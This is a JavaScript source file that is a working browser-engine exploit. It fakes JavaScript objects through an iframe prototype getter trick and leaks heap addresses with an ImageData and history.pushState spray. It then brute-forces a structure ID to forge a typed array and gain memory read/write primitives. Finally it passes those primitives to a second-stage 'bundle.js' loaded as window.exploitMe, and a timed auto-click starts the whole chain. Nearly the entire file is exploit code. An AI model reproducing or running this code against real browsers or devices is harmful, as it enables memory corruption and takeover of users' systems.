/* eslint no-redeclare: "off" */
/* eslint no-unmodified-loop-condition: "off" */
/* global XMLHttpRequest, alert, ImageData, postMessage, history */
function send (ep, data) {
	var msg = {
		msg: data
	};
	var jsonstr = JSON.stringify(msg);
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '/' + ep, false);
		xhr.setRequestHeader('Content-Type', 'application/json');
		xhr.send(jsonstr);
	} catch (e) {

	}
}

function log (msg) {
	send('log', msg === undefined ? 'undefined' : msg.toString());
}

window.onerror = function (msg, url, line) {
	if (msg === 'Out of memory') { alert(msg); }
	send('error', [line, msg]);
	//  location.reload();
};

function buildObject (lo, hi, cb) {
	log('Building stuff.');
	var a = [0, 4.243991582e-314, u2d(lo, hi), 3.5e-323, 3.5e-323];
	var f = document.body.appendChild(document.createElement('iframe'));
	f.contentWindow.Array.prototype.__defineGetter__(100, () => 1);
	var sub = f.contentWindow.Array.prototype.slice.call(a, 0, 4);
	f.remove();
	cb(sub[0]);
}

function leakAddrs (obja, objb, objc, cb) {
	log('Attempting leak...');
	var numbufs = 100 * 4;
	var numchunks = 5000;
	var chunks = new Array(numchunks);
	var validator = ~~(Math.random() * 0x10000);
	var vj = u2d(validator, 0);
	function checkState (state) {
		log('Checking...');
		var elementCount = state.width * state.height / 4;
		var rb = new Uint32Array(state.data.buffer);
		var f = false;
		for (var i = 0; i < elementCount; ++i) {
			if (!f && state.data[i] !== 0) {
				log('Found something. ' + i + ' ' + rb[i].toString(16));
				f = true;
			}
			if (rb[i] === validator && rb[i + 1] === 0x10000 &&
									rb[i + 2] !== 0 && rb[i + 4] !== 0 && rb[i + 6] !== 0 &&
									rb[i + 2] !== rb[i + 4] && rb[i + 3] < 0x100 && rb[i + 5] < 0x100
			) {
				log('Found data. ' + i);
				for (var j = 0; j < 12; ++j) {
					log(rb[i + j].toString(16));
				}
				return cb(null, [rb[i + 2], rb[i + 3]], [rb[i + 4], rb[i + 5]], [rb[i + 6], rb[i + 7]]);
			}
		}
		log('Fail...  Reload the applet -- do not refresh');
	}

	var id = new ImageData(1, 1 * 1024 * 1024 / 4);

	log('Allocating...');
	for (var j = 0; j < numchunks; ++j) {
		var bufs = chunks[j] = new Array(numbufs);
		for (var i = 0; i < numbufs; i += 4) {
			bufs[i] = vj;
			bufs[i + 1] = obja;
			bufs[i + 2] = objb;
			bufs[i + 3] = objc;
		}
		bufs = 0;
	}
	for (var j = 0; j < numchunks; ++j) { delete chunks[j]; }
	postMessage('', '*', [id.data.buffer]);
	history.pushState(id, '');
	setTimeout(function () { checkState(history.state); }, 0);
}

var _dview;
function u2d (low, hi) {
	if (!_dview) _dview = new DataView(new ArrayBuffer(8));
	_dview.setUint32(0, low, true);
	_dview.setUint32(4, hi, true);
	return _dview.getFloat64(0, true);
}

window.minmain = function minmain () {
	log('Starting.');
	buildObject(0, 0, function (b) {
		buildObject(0x1337, 0x1, function (d) {
			var sid = 1;
			var magic = {
				'a': u2d(sid, 0x1602300 - 0x10000),
				'b': b,
				'c': u2d(1, 2),
				'd': d
			};
			d = 0;
			b = 0;

			var bstore = new ArrayBuffer(0x10 * 4);
			var rwmagic = new Uint32Array(bstore);
			var leakee = {'b': null};
			var leaker = {'a': leakee};
			leakAddrs(magic, rwmagic, leaker, function (err, magicaddr, rwaddr, leakeraddr) {
				if (err) {
					return alert('error leaking');
				}
				buildObject(rwaddr[0], rwaddr[1], function (c) {
					magic.c = c;
					c = 0;
					buildObject(magicaddr[0] + 4 * 4, magicaddr[1], function (o) {
						log('Inside o...');
						while (sid < 0x10000 && !(o instanceof Uint32Array)) { magic.a = u2d(++sid, 0x1602300 - 0x10000); }
						if (!(o instanceof Uint32Array)) {
							log('Could not find structure ID.  Wtf?');
							return;
						}
						log('Success?');
						var save = [o[4], o[5], o[6]];

						o[4] = leakeraddr[0];
						o[5] = leakeraddr[1];
						o[6] = 0x1337;

						var va = new Uint32Array(bstore);
						var vb = new Uint32Array(bstore);
						leaker['a'] = leakee;
						leakee['b'] = {'a': va};
						var leakaddr = [rwmagic[4], rwmagic[5]];

						o[4] = leakaddr[0];
						o[5] = leakaddr[1];
						var ta = [rwmagic[4], rwmagic[5]];
						o[4] = ta[0];
						o[5] = ta[1];
						var addra = [rwmagic[4], rwmagic[5]];

						o[4] = leakaddr[0];
						o[5] = leakaddr[1];
						leakee['b'] = {'a': vb};
						ta = [rwmagic[4], rwmagic[5]];
						o[4] = ta[0];
						o[5] = ta[1];
						var addrb = [rwmagic[4], rwmagic[5]];

						o[4] = addra[0];
						o[5] = addra[1];
						rwmagic[4] = addrb[0];
						rwmagic[5] = addrb[1];

						o[4] = save[0];
						o[5] = save[1];
						o[6] = save[2];
						rwmagic = 0;
						magic.a = 0;
						magic.b = 0;
						magic.c = 0;
						magic.d = 0;
						o = 0;

						loadRun({
							bstore: bstore,
							va: va,
							vb: vb,
							leakee: leakee,
							leakaddr: leakaddr
						});
					});
				});
			});
		});
	});
};

function loadRun (obj) {
	window.exploitMe = obj;
	var elem = document.createElement('script');
	elem.setAttribute('src', 'bundle.js');
	document.body.appendChild(elem);
}

setTimeout(function () {
	document.getElementById('test').click();
}, 100);
